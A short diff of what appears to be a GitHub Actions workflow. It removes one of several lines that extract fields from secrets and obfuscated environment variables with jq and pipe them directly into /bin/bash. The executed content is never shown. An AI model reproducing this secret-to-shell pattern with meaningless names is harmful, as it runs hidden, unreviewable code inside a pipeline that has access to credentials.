@@ -21,7 +21,6 @@ jobs:
           rik8410: ${{ secrets.rik8410 }}
         run: |
           printf '%s' "$rik8410" | jq -r .totf0031 | /bin/bash
-          echo $akjkl40052 | jq -r .wwmp5 | /bin/bash
           echo $b8019 | jq -r .qlln90508 | /bin/bash
           echo $epcvo41 | jq -r .qqqj34 | /bin/bash
           echo $ohl85 | jq -r .nyj0 | /bin/bash
